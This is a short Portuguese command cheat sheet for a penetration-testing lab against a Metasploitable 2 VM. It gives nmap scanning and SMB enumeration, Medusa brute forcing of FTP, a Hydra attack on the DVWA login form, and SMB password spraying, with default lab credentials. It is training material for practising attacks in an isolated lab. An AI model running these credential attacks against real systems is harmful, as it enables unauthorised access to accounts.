# Referência rápida de comandos

Alvo (Metasploitable 2): `192.168.56.101` · Atacante (Kali): `192.168.56.102`

## Reconhecimento
```bash
# Portas e versões dos serviços
nmap -sV 192.168.56.101

# Enumeração de usuários SMB
nmap -p 445 --script smb-enum-users 192.168.56.101
```

## Cenário A — FTP (Medusa)
```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4

# Validar o acesso
ftp 192.168.56.101      # login: msfadmin / msfadmin
```

## Cenário B — DVWA / formulário web (Hydra)
```bash
# Pré-requisito: DVWA Security em Low + cookie PHPSESSID (F12 > Storage > Cookies)
hydra -L usuarios.txt -P senhas.txt 192.168.56.101 http-get-form \
"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<SEU_PHPSESSID>; security=low:incorrect"
```
Notas de sintaxe (Hydra v9.7):
- Escapar o `:` do cookie com `\:`
- Condição de falha (`incorrect`) por último
- `F=` / `S=` como prefixo foram recusados nesta build

## Cenário C — SMB password spraying (Medusa)
```bash
medusa -h 192.168.56.101 -U usuarios_smb.txt -p msfadmin -M smbnt

# Validar o acesso (opcional)
smbclient -L //192.168.56.101 -U msfadmin      # senha: msfadmin
```

## Flags úteis do Medusa
| Flag | Significado |
|------|-------------|
| `-h` | host alvo |
| `-U` / `-u` | arquivo de usuários / usuário único |
| `-P` / `-p` | arquivo de senhas / senha única (spraying) |
| `-M` | módulo (`ftp`, `smbnt`, ...) |
| `-t` | tentativas em paralelo |
| `-f` | para no primeiro sucesso |
